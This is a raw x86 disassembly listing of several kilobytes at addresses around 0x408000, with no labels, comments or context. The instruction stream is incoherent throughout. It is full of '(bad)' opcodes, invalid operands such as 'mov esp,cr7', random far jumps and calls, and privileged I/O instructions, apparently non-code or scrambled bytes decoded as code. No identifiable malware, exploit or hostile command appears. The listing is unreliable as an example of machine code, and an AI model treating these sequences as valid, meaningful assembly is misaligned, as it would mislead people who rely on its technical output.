  4080cd:	ins    DWORD PTR es:[edi],dx
  4080ce:	or     esp,DWORD PTR [esi]
  4080d0:	lods   al,BYTE PTR ds:[esi]
  4080d1:	sbb    edx,edi
  4080d3:	out    0x46,al
  4080d5:	mov    esi,0x6f2fd751
  4080da:	jecxz  0x408060
  4080dc:	test   BYTE PTR [edi],0xc4
  4080df:	popa   
  4080e0:	xchg   BYTE PTR [edi+0x54],bh
  4080e3:	mov    dh,0xae
  4080e5:	pop    esi
  4080e6:	mov    ebx,0x61c32a0d
  4080eb:	sbb    edi,ebx
  4080ed:	inc    edx
  4080ee:	sbb    ecx,esp
  4080f0:	adc    edi,DWORD PTR [esp+ecx*1+0x1bf26efb]
  4080f7:	ret    0x5228
  4080fa:	arpl   WORD PTR [ebx],bx
  4080fc:	mov    ds:0xb01d51f4,eax
  408101:	push   esp
  408102:	ret    0xc304
  408105:	jecxz  0x40808a
  408107:	sti    
  408108:	jnp    0x408140
  40810a:	xchg   ecx,eax
  40810b:	into   
  40810c:	sbb    DWORD PTR [esi+0x5f],edx
  40810f:	in     al,0x3c
  408111:	ds push es
  408113:	loop   0x40814b
  408115:	push   cs
  408116:	jmp    0x44f24df7
  40811b:	push   cs
  40811c:	add    DWORD PTR ds:0xb637ceb6,ecx
  408122:	retf   0x7997
  408125:	in     eax,dx
  408126:	les    edi,FWORD PTR [edx-0x319a0d83]
  40812c:	inc    edi
  40812d:	jg     0x40815e
  40812f:	mov    esp,0x52e34821
  408134:	mov    eax,0x310bf5aa
  408139:	mov    ah,0x26
  40813b:	xlat   BYTE PTR ds:[ebx]
  40813c:	cld    
  40813d:	pop    edx
  40813e:	push   ecx
  40813f:	ds dec ebp
  408141:	inc    esp
  408142:	pop    eax
  408143:	daa    
  408144:	popf   
  408145:	push   ds
  408146:	(bad)  
  408147:	aaa    
  408148:	stos   DWORD PTR es:[edi],eax
  408149:	xor    eax,eax
  40814b:	adc    eax,0x549cdaec
  408150:	or     DWORD PTR [bp+0x4f],ebp
  408154:	mov    al,0x3b
  408156:	adc    edx,DWORD PTR [ebx+eax*2-0x68]
  40815a:	sub    BYTE PTR [ebp+0x4b],bl
  40815d:	inc    esp
  40815e:	pop    esi
  40815f:	inc    edi
  408160:	mov    BYTE PTR [eax+edx*2],dl
  408163:	data16 and dl,BYTE PTR [edx]
  408166:	test   BYTE PTR [ecx+0x763c7f9],dl
  40816c:	and    BYTE PTR [edi+0xe],cl
  40816f:	popa   
  408170:	cdq    
  408171:	adc    edi,edi
  408173:	loope  0x408147
  408175:	add    ebx,DWORD PTR cs:[ebx]
  408178:	jg     0x4081b7
  40817a:	dec    edi
  40817b:	shl    BYTE PTR [edx+edx*8-0x8da97df],cl
  408182:	outs   dx,DWORD PTR ds:[esi]
  408183:	aaa    
  408184:	add    DWORD PTR [edx+0x27],eax
  408187:	outs   dx,DWORD PTR ds:[esi]
  408188:	mov    al,0x5
  40818a:	push   ecx
  40818b:	aaa    
  40818c:	mov    dh,0xdf
  40818e:	outs   dx,BYTE PTR ds:[esi]
  40818f:	push   ds
  408190:	call   0x6b98:0x47a48776
  408197:	adc    al,0x45
  408199:	push   0xe263ee3f
  40819e:	mov    eax,0x60e7fa50
  4081a3:	mov    ds:0x2b3d32fc,eax
  4081a8:	push   ecx
  4081a9:	pop    ebx
  4081aa:	xor    eax,0x4b8087f4
  4081af:	pop    eax
  4081b0:	outs   dx,DWORD PTR ds:[esi]
  4081b1:	pushf  
  4081b2:	mov    ebx,0x7c8b820f
  4081b7:	pop    eax
  4081b8:	push   es
  4081b9:	std    
  4081ba:	dec    esi
  4081bb:	xchg   ebx,eax
  4081bc:	xor    eax,0x658bd0c4
  4081c1:	lods   al,BYTE PTR ds:[esi]
  4081c2:	push   ebx
  4081c3:	daa    
  4081c4:	mov    ecx,0x7edb9145
  4081c9:	in     al,0x7b
  4081cb:	fwait
  4081cc:	add    bl,bh
  4081ce:	and    esi,edi
  4081d0:	and    al,0x9e
  4081d2:	and    dl,BYTE PTR [ebp+0x2500c969]
  4081d8:	cmp    DWORD PTR [esi-0x6f2a195e],ebp
  4081de:	fadd   st(1),st
  4081e0:	bound  eax,QWORD PTR [ebp+0xd651444]
  4081e6:	mov    al,0x39
  4081e8:	ins    DWORD PTR es:[edi],dx
  4081e9:	sbb    bl,BYTE PTR [ebx-0x33]
  4081ec:	mov    esi,0x265d69f7
  4081f1:	iret   
  4081f2:	push   cs
  4081f3:	test   esi,eax
  4081f5:	lock xor BYTE PTR [ecx+0x11e9a161],bl
  4081fc:	add    eax,0xcc40dda7
  408201:	mov    dh,0xb3
  408203:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408204:	inc    esi
  408205:	add    eax,0xfaa2d26b
  40820a:	adc    al,0x2
  40820c:	jmp    0x1fee:0x74ce300b
  408213:	cmp    al,0xad
  408215:	mov    DWORD PTR [esi+0x1feeb0e9],edx
  40821b:	add    edi,edi
  40821d:	mov    edx,0x1b2857d7
  408222:	jnp    0x4081bf
  408224:	shr    ebx,0x39
  408227:	jmp    0xe12f43d7
  40822c:	scas   eax,DWORD PTR es:[edi]
  40822d:	mov    cl,0xcd
  40822f:	dec    esp
  408230:	push   ebp
  408231:	shr    edi,0x56
  408234:	jecxz  0x4081bb
  408236:	xchg   edi,eax
  408237:	dec    edx
  408238:	dec    ecx
  408239:	into   
  40823a:	repz (bad) 
  40823c:	aam    0x8a
  40823e:	xlat   BYTE PTR ds:[ebx]
  40823f:	dec    esi
  408240:	jns    0x4082b5
  408242:	cld    
  408243:	nop
  408244:	jb     0x40823e
  408246:	lods   al,BYTE PTR ds:[esi]
  408247:	fld    TBYTE PTR [ebx-0x30638254]
  40824d:	ja     0x408250
  40824f:	jp     0x408283
  408251:	ins    DWORD PTR es:[edi],dx
  408252:	fdivr  QWORD PTR [ebx-0x15dd737e]
  408258:	cs jbe 0x408273
  40825b:	pusha  
  40825c:	test   esp,edi
  40825e:	pop    edi
  40825f:	xor    BYTE PTR [ebp+ebx*2-0x5da9649f],dl
  408266:	clc    
  408267:	xlat   BYTE PTR ds:[ebx]
  408268:	pop    es
  408269:	push   eax
  40826a:	ss push ecx
  40826c:	inc    ebx
  40826d:	pop    ebx
  40826e:	xor    DWORD PTR [ebx+0x2a915061],ecx
  408274:	sbb    bh,BYTE PTR [edx]
  408276:	or     al,0x9c
  408278:	shl    DWORD PTR [edx-0x18],1
  40827b:	xor    dl,BYTE PTR [esi-0x6207ee32]
  408281:	nop    DWORD PTR [ecx+0x2]
  408285:	and    eax,DWORD PTR [ebp+0x36]
  408288:	jg     0x4082be
  40828a:	fst    QWORD PTR [eax+0x7ac11bce]
  408290:	(bad)  
  408291:	mov    ah,0x14
  408293:	jo     0x4082e6
  408295:	pushf  
  408296:	adc    DWORD PTR [ebp+0x7ed5db71],ebx
  40829c:	inc    ebp
  40829d:	outs   dx,DWORD PTR ds:[esi]
  40829e:	push   ebx
  40829f:	mov    bh,0x29
  4082a1:	(bad)  
  4082a2:	call   0x60241d12
  4082a7:	mov    al,ds:0xe49de138
  4082ac:	and    ebx,ebp
  4082ae:	mov    cl,0xe3
  4082b0:	dec    eax
  4082b1:	xlat   BYTE PTR ds:[ebx]
  4082b2:	jo     0x408244
  4082b4:	ret    0x6f79
  4082b7:	enter  0x2a09,0xc8
  4082bb:	mov    esi,0xd6393e0e
  4082c0:	fistp  DWORD PTR [eax]
  4082c2:	and    BYTE PTR [ecx],cl
  4082c4:	bound  edi,QWORD PTR [edx-0x17]
  4082c7:	cmp    al,0xf2
  4082c9:	mov    edi,0x7be705a
  4082ce:	push   edx
  4082cf:	pop    ebp
  4082d0:	dec    esi
  4082d1:	popa   
  4082d2:	int3   
  4082d3:	add    BYTE PTR ss:[edx],0xfb
  4082d7:	mov    DWORD PTR [esi],ebp
  4082d9:	cmp    DWORD PTR [esi-0x5b214bb1],ebx
  4082df:	jb     0x40828c
  4082e1:	shl    DWORD PTR [edi-0x5a],0xea
  4082e5:	or     eax,0x1424888e
  4082ea:	adc    al,0x16
  4082ec:	xchg   esp,eax
  4082ed:	test   al,0xcb
  4082ef:	(bad)  
  4082f0:	stos   DWORD PTR es:[edi],eax
  4082f1:	push   es
  4082f2:	fimul  DWORD PTR [eax-0x9d2d84e]
  4082f8:	xchg   edx,eax
  4082f9:	out    0x88,eax
  4082fb:	outs   dx,DWORD PTR ds:[esi]
  4082fc:	mov    ?,WORD PTR [ecx-0x33]
  4082ff:	ins    BYTE PTR es:[edi],dx
  408300:	(bad)  
  408301:	push   0x4be4007d
  408306:	cmp    al,0xfa
  408308:	cmp    eax,esp
  40830a:	retf   
  40830b:	mov    dl,BYTE PTR [ebx+0x1d]
  40830e:	fmul   QWORD PTR [edx+0x74]
  408311:	dec    esi
  408312:	dec    ebp
  408313:	adc    al,0x32
  408315:	pusha  
  408316:	xchg   ebp,eax
  408317:	pop    ecx
  408318:	push   ecx
  408319:	(bad)  
  40831a:	(bad)  
  40831b:	out    dx,eax
  40831c:	ficom  DWORD PTR [edx-0x43b33322]
  408322:	mov    edi,DWORD PTR [eax+ebx*1]
  408325:	jno    0x4082dd
  408327:	mov    dl,0x28
  408329:	paddq  mm3,mm7
  40832c:	cmp    BYTE PTR [edx],al
  40832e:	(bad)  
  40832f:	push   eax
  408330:	inc    eax
  408331:	add    eax,0x8ff09111
  408336:	sbb    edx,DWORD PTR [eax]
  408338:	jmp    0x51a3966e
  40833d:	cmp    ebx,ebp
  40833f:	pop    edx
  408340:	shl    BYTE PTR [esi-0x47de11d0],0x9e
  408347:	mov    DWORD PTR [edx+0x1d],eax
  40834a:	pop    eax
  40834b:	push   es
  40834c:	(bad)  
  40834d:	jg     0x4083ca
  40834f:	lods   al,BYTE PTR ds:[esi]
  408350:	daa    
  408351:	dec    edi
  408352:	and    esi,edi
  408354:	and    BYTE PTR [ecx+ebx*4-0x30],0xeb
  408359:	ins    BYTE PTR es:[edi],dx
  40835a:	mov    DWORD PTR [ebp-0x1e28a87b],esp
  408360:	mov    ch,0xc5
  408362:	test   eax,0xde1656c5
  408367:	imul   edx,eax,0x79
  40836a:	call   0x4fb4:0xd2bba171
  408371:	imul   edx,DWORD PTR [ebx-0x4d],0xb
  408375:	mov    ss,WORD PTR [eax]
  408377:	cmc    
  408378:	pop    ecx
  40837a:	in     al,dx
  40837b:	aam    0xa4
  40837d:	sub    dh,BYTE PTR [edi-0x11e8ab5]
  408383:	int3   
  408384:	rcl    BYTE PTR [eax],cl
  408386:	mov    edi,ebx
  408388:	mov    al,ds:0x574ef15f
  40838d:	jge    0x40836e
  40838f:	mov    esi,0x32e27255
  408394:	scas   al,BYTE PTR es:[edi]
  408395:	bound  edx,QWORD PTR [ebp-0x50]
  408398:	push   es
  408399:	add    BYTE PTR [ebx],dl
  40839b:	adc    DWORD PTR [eax-0x117c6bb2],0xffffffde
  4083a2:	push   esp
  4083a3:	fmul   DWORD PTR [ecx-0x69bf89ef]
  4083a9:	in     eax,0xf2
  4083ab:	or     dh,BYTE PTR [ecx]
  4083ad:	not    DWORD PTR [ebx-0x283689ce]
  4083b3:	add    eax,0xf440c918
  4083b8:	mov    bh,0xe3
  4083ba:	mov    ss,WORD PTR [ecx]
  4083bc:	loope  0x4083cf
  4083be:	xor    al,0xe7
  4083c0:	mov    ecx,0x16b1269c
  4083c5:	adc    eax,0x3d081bf5
  4083ca:	aas    
  4083cb:	sub    esi,esi
  4083cd:	cmp    eax,0x3fc3318e
  4083d2:	in     eax,dx
  4083d3:	aam    0x23
  4083d5:	sbb    DWORD PTR [esi+0xb53f5d6],0x74
  4083dc:	cmp    ecx,DWORD PTR ds:0x2e336a22
  4083e2:	data16 jnp 0x408429
  4083e5:	xor    al,0xbe
  4083e7:	adc    eax,0x52a727e4
  4083ec:	idiv   BYTE PTR [eax-0x78]
  4083ef:	aad    0x10
  4083f1:	ficomp DWORD PTR [edi]
  4083f3:	dec    ecx
  4083f4:	(bad)  
  4083f6:	rol    BYTE PTR [eax+edi*1],1
  4083f9:	pop    es
  4083fa:	(bad)  [ebx]
  4083fc:	cld    
  4083fd:	ins    DWORD PTR es:[edi],dx
  4083fe:	inc    esp
  4083ff:	call   0x980b:0x475d8fde
  408406:	outs   dx,DWORD PTR ds:[esi]
  408407:	pop    DWORD PTR [ebp+edi*2-0x418153a8]
  40840e:	cmp    ecx,ebx
  408410:	mov    fs,WORD PTR [ecx+0x35f01a8a]
  408416:	sbb    BYTE PTR [ebp-0x12556622],dl
  40841c:	out    0xd7,al
  40841e:	cmp    ah,ch
  408420:	cli    
  408421:	aam    0x95
  408423:	nop
  408424:	xlat   BYTE PTR ds:[ebx]
  408425:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408426:	(bad)  
  408428:	sbb    al,0xcc
  40842a:	xchg   ebx,eax
  40842b:	sbb    al,0x72
  40842d:	push   eax
  40842e:	test   ebp,0x3e955aa4
  408434:	xor    BYTE PTR [ebx-0x32af03dc],0x41
  40843b:	cmp    al,0x92
  40843d:	xor    al,0x87
  40843f:	cmove  edx,ebp
  408442:	push   ebx
  408443:	sub    BYTE PTR [eax],cl
  408445:	jb     0x40841a
  408447:	jae    0x4083e1
  408449:	data16 jl 0x4084c3
  40844c:	and    al,BYTE PTR fs:[ebx+ebp*4]
  408450:	sub    DWORD PTR [ebp+eax*8+0x17e28b26],edi
  408457:	daa    
  408458:	jne    0x408461
  40845a:	int    0x94
  40845c:	and    dl,bh
  40845e:	or     eax,0x25782abc
  408463:	fcomp  QWORD PTR [ebx]
  408465:	pop    ebp
  408466:	rcr    BYTE PTR [ecx],1
  408468:	mov    ebp,0x7f898bf
  40846d:	mov    ds:0xad8aa7fa,eax
  408472:	call   0xf4d31b4c
  408477:	mov    ds:0xc358a7cf,eax
  40847c:	cli    
  40847d:	sahf   
  40847e:	cmp    edi,DWORD PTR [edi-0x58fa354e]
  408484:	mov    esp,cr7
  408487:	rcl    DWORD PTR [edx-0x393f54e0],1
  40848d:	les    ecx,FWORD PTR ds:[ebx]
  408490:	stc    
  408491:	cwde   
  408492:	push   cs
  408493:	xchg   esp,eax
  408494:	xchg   esp,eax
  408495:	sub    esp,DWORD PTR [edx]
  408497:	sbb    al,0x8
  408499:	dec    ecx
  40849a:	inc    ebx
  40849b:	outs   dx,BYTE PTR ds:[esi]
  40849c:	push   esp
  40849d:	mov    es:0x79cd982b,al
  4084a3:	adc    dh,bh
  4084a5:	sbb    BYTE PTR [ebp-0x5358a2f0],0xdf
  4084ac:	push   gs
  4084ae:	cmp    al,0x9a
  4084b0:	jge    0x408452
  4084b2:	and    ebp,ebx
  4084b4:	sbb    al,0xf
  4084b6:	xchg   esi,eax
  4084b7:	mov    edx,0xd300fc4
  4084bc:	dec    ebx
  4084bd:	dec    eax
  4084be:	mov    bl,0x9b
  4084c0:	jg     0x408476
  4084c2:	stc    
  4084c3:	dec    ecx
  4084c4:	in     al,0x7b
  4084c6:	int    0x30
  4084c8:	cmp    BYTE PTR [ecx+0x3af4ca9],0xbc
  4084cf:	fstp   QWORD PTR [esi-0x59e1cc8d]
  4084d5:	sub    dl,BYTE PTR [ecx*8+0x7d5e00c6]
  4084dc:	icebp  
  4084dd:	cvtps2pd xmm4,QWORD PTR ds:0x579f5905
  4084e4:	aad    0x74
  4084e6:	iret   
  4084e7:	or     cl,BYTE PTR [ebp+0x6]
  4084ea:	dec    ebp
  4084eb:	in     al,0x68
  4084ed:	test   al,0x46
  4084ef:	je     0x408541
  4084f1:	imul   ebx,DWORD PTR [ebx+ebp*4+0xc],0x1c8fb4f2
  4084f9:	inc    esi
  4084fa:	sub    DWORD PTR [ebx],ecx
  4084fc:	das    
  4084fd:	xchg   esp,eax
  4084fe:	or     ebp,DWORD PTR [esi+edi*2-0x6b7d5198]
  408505:	aam    0xc8
  408507:	jb     0x408504
  408509:	rcl    BYTE PTR [esi+0x1752ac58],1
  40850f:	or     ch,BYTE PTR [esi]
  408511:	push   ecx
  408512:	push   ebx
  408513:	ret    0x9e84
  408516:	shl    BYTE PTR [ebx],cl
  408518:	nop
  408519:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40851a:	cmp    edx,DWORD PTR [ebx-0xc]
  40851d:	mov    esi,0x886d5cdb
  408522:	sub    al,0xc7
  408524:	cmp    bh,0x53
  408527:	sbb    eax,0xc3fba5b5
  40852c:	mov    ebp,0x3372b1e3
  408531:	push   ss
  408532:	idiv   BYTE PTR [esi-0x58]
  408535:	in     al,0x45
  408537:	mov    ebp,0x270ea281
  40853c:	mov    cl,0x62
  40853e:	rcl    edi,0x73
  408541:	or     eax,0x75f35430
  408546:	push   0xc92e21ec
  40854b:	sbb    al,0xb1
  40854d:	call   0xa0dda51
  408552:	call   0x1783:0x36d01fd3
  408559:	ror    DWORD PTR ds:0x3c56312b,cl
  40855f:	adc    BYTE PTR [ebx+esi*1],cl
  408562:	jle    0x408573
  408564:	das    
  408565:	or     eax,0xbf83ca91
  40856a:	mov    eax,DWORD PTR [ecx-0x6bb644e4]
  408570:	das    
  408571:	xchg   edx,eax
  408572:	fmul   QWORD PTR [eax-0x5a839e0d]
  408578:	jg     0x40851a
  40857a:	jo     0x408559
  40857c:	mov    ds:0x7b221c2c,eax
  408581:	xor    eax,0x108f573a
  408586:	aam    0xfd
  408588:	sub    al,ch
  40858a:	pop    esp
  40858b:	iret   
  40858c:	push   ds
  40858d:	sti    
  40858e:	pop    ss
  40858f:	push   ecx
  408590:	imul   ebp,edi,0x5c824993
  408596:	or     ah,ch
  408598:	xchg   esp,eax
  408599:	fimul  WORD PTR [edx-0x6c965fe9]
  40859f:	out    dx,al
  4085a0:	or     al,0xd8
  4085a2:	cli    
  4085a3:	mov    edi,0x92e721b2
  4085a8:	test   BYTE PTR [ecx-0xe6fd776],0x38
  4085af:	fcmovbe st,st(6)
  4085b1:	cmp    al,0x42
  4085b3:	addr16 xchg ecx,eax
  4085b5:	fiadd  WORD PTR [ebx+0x4d]
  4085b8:	mov    ecx,DWORD PTR [ecx]
  4085ba:	jb     0x4085ed
  4085bc:	jns    0x40861c
  4085be:	rol    BYTE PTR [ebp+edx*4+0x73],cl
  4085c2:	dec    ebx
  4085c3:	add    BYTE PTR [edx-0x12],ch
  4085c6:	add    BYTE PTR [ebx+0x5c],0x3f
  4085ca:	sbb    eax,0xf99e4999
  4085cf:	push   esi
  4085d0:	fwait
  4085d1:	dec    dh
  4085d3:	add    eax,0xe66d3027
  4085d8:	mov    DWORD PTR [ebp-0xc],0xf89c85a4
  4085df:	mov    eax,DWORD PTR [ebp-0x4]
  4085e2:	jmp    0x40a991
  4085e7:	sbb    eax,0x84488431
  4085ec:	les    ebx,FWORD PTR [ebp+0xc292524]
  4085f2:	push   0xffffffae
  4085f4:	jge    0x408640
  4085f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4085f7:	jns    0x408612
  4085f9:	add    DWORD PTR [ebx-0x7c7c9f0f],0x58
  408600:	(bad)  
  408601:	mov    WORD PTR [esi+0x65642da],cs
  408607:	outs   dx,BYTE PTR ds:[esi]
  408608:	es into 
  40860a:	mov    bl,0x9e
  40860c:	mov    esi,0x9766d0a7
  408611:	(bad)  
  408612:	jmp    0x40864b
  408614:	sub    esp,esi
  408616:	sub    esi,esp
  408618:	push   ds
  408619:	xor    al,0xd
  40861b:	aam    0xe7
  40861d:	ret    0x9544
  408620:	adc    al,0xe5
  408622:	inc    eax
  408623:	jl     0x4085f4
  408625:	sub    BYTE PTR [ebp-0x52],ch
  408628:	cmp    eax,0x578aa1a6
  40862d:	lds    esp,FWORD PTR [eax+0x24e82f07]
  408633:	scas   eax,DWORD PTR es:[edi]
  408634:	test   DWORD PTR [edi-0x5a7cb2ce],ebp
  40863a:	and    eax,0x35691e47
  40863f:	fucompp 
  408641:	scas   eax,DWORD PTR es:[edi]
  408642:	jo     0x4085ff
  408644:	xchg   ebx,eax
  408645:	out    0x45,al
  408647:	fs nop
  408649:	arpl   WORD PTR [esi],di
  40864b:	dec    ebp
  40864c:	jo     0x408666
  40864e:	add    DWORD PTR [edx-0x3de24b5c],ebx
  408654:	inc    edx
  408655:	ficom  WORD PTR [ebx*4+0x8d0dd52]
  40865c:	(bad)  
  40865d:	jecxz  0x40861a
  40865f:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  408661:	push   0x214f2da7
  408666:	mov    edi,0xfde2d57f
  40866b:	add    al,0x7a
  40866d:	push   0xffffff8b
  40866f:	mov    ebp,0x962be642
  408674:	cs test al,0x7b
  408678:	cmp    esi,DWORD PTR [eax]
  40867a:	stc    
  40867b:	inc    ebx
  40867c:	(bad)  
  40867d:	imul   esi,DWORD PTR [ebx-0xc7833d1],0xfffffff3
  408684:	sbb    ebx,DWORD PTR [ebx+eiz*2+0x394687e6]
  40868b:	dec    edi
  40868c:	fnstcw WORD PTR [ecx-0x43fce95e]
  408692:	xor    al,0x5d
  408694:	adc    ecx,ecx
  408696:	mov    ebp,0xd0186bf1
  40869b:	and    dl,BYTE PTR [esi-0x20a443db]
  4086a1:	or     ch,BYTE PTR [esi-0x2240270]
  4086a7:	ds (bad) 
  4086a9:	nop
  4086aa:	adc    DWORD PTR [esi+0x3f],eax
  4086ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4086ae:	scas   al,BYTE PTR es:[edi]
  4086af:	add    ah,bl
  4086b1:	lods   al,BYTE PTR ds:[esi]
  4086b2:	popf   
  4086b3:	xor    ch,BYTE PTR [ebx+0x7e41488a]
  4086b9:	adc    ebp,DWORD PTR [edx-0x72]
  4086bc:	pop    ecx
  4086bd:	jns    0x4086e2
  4086bf:	jmp    0xbace87d9
  4086c4:	adc    al,0x84
  4086c6:	loop   0x408736
  4086c8:	sub    al,BYTE PTR fs:[ecx]
  4086cb:	jne    0x408669
  4086cd:	test   DWORD PTR [eax],0x244295eb
  4086d3:	mov    ah,al
  4086d5:	mov    cl,0xf6
  4086d7:	out    0x2d,eax
  4086d9:	ds sahf 
  4086db:	xchg   ebp,eax
  4086dc:	cdq    
  4086dd:	aaa    
  4086de:	retf   0xff82
  4086e1:	mov    bl,0xe6
  4086e3:	stos   BYTE PTR es:[edi],al
  4086e4:	sar    BYTE PTR [edi+0x24d3a745],cl
  4086ea:	shr    DWORD PTR [ebx+0x52],0x86
  4086ee:	enter  0x6df,0x6b
  4086f2:	inc    eax
  4086f3:	dec    ecx
  4086f4:	cdq    
  4086f5:	sub    bl,BYTE PTR [eax-0xf72c3fe]
  4086fb:	int    0xfc
  4086fd:	call   0xa26c:0xa3e857c5
  408704:	mov    BYTE PTR [ebx],0xfd
  408707:	mov    ds:0x203eb966,al
  40870c:	addr16 inc ebp
  40870e:	and    al,0x56
  408710:	inc    ecx
  408711:	or     ebx,ebx
  408713:	xor    BYTE PTR [eax-0x2d6b768f],dh
  408719:	(bad)  
  40871a:	push   eax
  40871b:	jecxz  0x408729
  40871d:	pop    ds
  40871e:	push   esp
  40871f:	scas   eax,DWORD PTR es:[edi]
  408720:	icebp  
  408721:	into   
  408722:	dec    ebp
  408723:	jmp    0x975e:0x565427a
  40872a:	test   eax,0xe7bc4f6d
  40872f:	loopne 0x4086f8
  408731:	addr16 mov eax,ds:0x7250
  408735:	fs rcr ah,1
  408738:	popa   
  408739:	sub    al,0xbd
  40873b:	stos   BYTE PTR es:[edi],al
  40873c:	leave  
  40873d:	cdq    
  40873e:	cwde   
  40873f:	loop   0x4087b3
  408741:	adc    al,0xbc
  408743:	pusha  
  408744:	(bad)  
  408745:	mov    al,ds:0x72d0a25e
  40874a:	out    0x96,eax
  40874c:	sbb    al,0x80
  40874e:	cwde   
  40874f:	mov    BYTE PTR [edx-0x11],0xf3
  408753:	lahf   
  408754:	mov    ah,0x5a
  408756:	bound  ebp,QWORD PTR [edx]
  408758:	pop    ds
  408759:	mov    ds:0x4354ee0a,al
  40875e:	mov    edi,0xdf5ec434
  408763:	fistp  QWORD PTR [esi+0x8e7b5]
  408769:	clc    
  40876a:	mov    cl,bl
  40876c:	or     edx,eax
  40876e:	add    edi,esp
  408770:	jb     0x4087bf
  408772:	ret    
  408773:	(bad)  
  408774:	mov    esp,0x6766793b
  408779:	add    eax,0xbf64f678
  40877e:	dec    ebx
  40877f:	sahf   
  408780:	imul   ebp,edi,0xb4098401
  408786:	ffreep st(2)
  408788:	jmp    0x8065:0xf56780a0
  40878f:	mov    eax,ds:0x15cde4e
  408794:	pop    ds
  408795:	cli    
  408796:	loope  0x408759
  408798:	pop    edi
  408799:	enter  0x5e22,0xd0
  40879d:	cmp    al,0xb7
  40879f:	inc    edi
  4087a0:	lock mov ds:0x2652715f,al
  4087a6:	fdivp  st(2),st
  4087a8:	push   ebx
  4087a9:	jge    0x4087c6
  4087ab:	enter  0xcbee,0x38
  4087af:	cmp    BYTE PTR [eax],al
  4087b1:	add    dh,BYTE PTR [edx-0x65aa9c2f]
  4087b7:	rcl    BYTE PTR [ebp+0x13],0xa2
  4087bb:	and    dl,dh
  4087bd:	fcomp  QWORD PTR [esp+ebx*4+0x785111ab]
  4087c4:	out    dx,al
  4087c5:	xor    al,0xb2
  4087c7:	xor    al,0xc5
  4087c9:	cmc    
  4087ca:	sbb    esi,DWORD PTR [esi+esi*1-0x733d4324]
  4087d1:	pushf  
  4087d2:	and    eax,0xe53a2eff
  4087d7:	les    ebp,FWORD PTR [edx+0x45]
  4087da:	data16 fild WORD PTR [edx-0x6226f8e6]
  4087e1:	and    ebx,esi
  4087e3:	inc    esi
  4087e4:	loop   0x40876d
  4087e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4087e7:	adc    BYTE PTR [eax+0x1f],cl
  4087ea:	jle    0x4087d9
  4087ec:	ret    0xae06
  4087ef:	enter  0x7cad,0xa9
  4087f3:	inc    edi
  4087f4:	and    eax,edi
  4087f6:	mov    edx,DWORD PTR [edi+edx*8]
  4087f9:	stos   BYTE PTR es:[edi],al
  4087fa:	retf   
  4087fb:	mov    ebp,0x1fde6073
  408800:	out    dx,al
  408801:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408802:	ds mov ss,esi
  408805:	cwde   
  408806:	or     al,0xe8
  408808:	out    dx,eax
  408809:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40880a:	inc    edx
  40880b:	xor    eax,0xa2bfd932
  408810:	sbb    eax,0x5ea015e
  408815:	imul   esi,eax,0x23
  408818:	stos   BYTE PTR es:[edi],al
  408819:	je     0x4087a2
  40881b:	rcl    DWORD PTR [ebp+0x2ad0782e],1
  408821:	jmp    0xf5541e67
  408826:	call   0xf0076205
  40882b:	sbb    bh,BYTE PTR [ebp+0x489c7e1]
  408831:	std    
  408832:	cmc    
  408833:	xchg   BYTE PTR [ebx+esi*4+0x6484c52],ah
  40883a:	cdq    
  40883b:	push   esi
  40883c:	sbb    eax,0x28f805f5
  408841:	gs icebp 
  408843:	leave  
  408844:	push   ebp
  408845:	js     0x408804
  408847:	ret    0xd055
  40884a:	sbb    ah,BYTE PTR [ebx]
  40884c:	test   dh,bh
  40884e:	int    0xc6
  408850:	adc    al,0xbb
  408852:	adc    al,0xa5
  408854:	cs sub eax,0x45b9aef3
  40885a:	xor    al,0x14
  40885c:	sub    BYTE PTR [edi-0x46],bl
  40885f:	mov    ds:0x56db7f00,al
  408864:	push   ebx
  408865:	mov    eax,ds:0xb0b18337
  40886a:	pop    esi
  40886b:	fidiv  WORD PTR [ecx+0x73]
  40886e:	pop    esp
  40886f:	scas   al,BYTE PTR es:[edi]
  408870:	pop    es
  408871:	(bad)  
  408872:	inc    ebp
  408873:	das    
  408874:	outs   dx,BYTE PTR ds:[esi]
  408875:	ja     0x408825
  408877:	sub    BYTE PTR [ecx],dh
  408879:	enter  0xbe67,0xe4
  40887d:	ds push 0x449b28e5
  408883:	mov    bl,0x44
  408885:	sbb    BYTE PTR [esi-0x68],cl
  408888:	ins    BYTE PTR es:[edi],dx
  408889:	stos   DWORD PTR es:[edi],eax
  40888a:	loope  0x4088cc
  40888c:	inc    ecx
  40888d:	mov    esp,0xe5048068
  408892:	mov    al,ds:0xa44da8c8
  408897:	sbb    ecx,DWORD PTR [edx-0x59]
  40889a:	pop    edi
  40889b:	inc    esi
  40889c:	mov    WORD PTR [ebx-0x762b1e5f],es
  4088a2:	mov    bl,0xa2
  4088a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4088a5:	push   es
  4088a6:	nop
  4088a7:	(bad)  
  4088a8:	lods   eax,DWORD PTR ds:[esi]
  4088a9:	inc    edi
  4088aa:	push   ds
  4088ab:	into   
  4088ac:	pop    edi
  4088ad:	inc    edx
  4088ae:	lahf   
  4088af:	repnz mov esi,0x57423f23
  4088b5:	fcomi  st,st(0)
  4088b7:	sbb    al,0xfa
  4088b9:	dec    eax
  4088ba:	outs   dx,BYTE PTR ds:[esi]
  4088bb:	push   ebp
  4088bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4088bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4088be:	push   es
  4088bf:	into   
  4088c0:	and    al,0x68
  4088c2:	sbb    DWORD PTR [edi+0x163cd2b],ebx
  4088c8:	scas   eax,DWORD PTR es:[edi]
  4088c9:	lock dec ebp
  4088cb:	rol    BYTE PTR [ebx+ebp*4],0xdf
  4088cf:	cs popa 
  4088d1:	sbb    eax,DWORD PTR [esp+ecx*4+0x33]
  4088d5:	push   ebp
  4088d6:	adc    BYTE PTR [eax-0x3e],dh
  4088d9:	cs jae 0x40892c
  4088dc:	in     eax,0xd6
  4088de:	aas    
  4088df:	sbb    dl,BYTE PTR [ebx+0x4b813a29]
  4088e5:	jns    0x408957
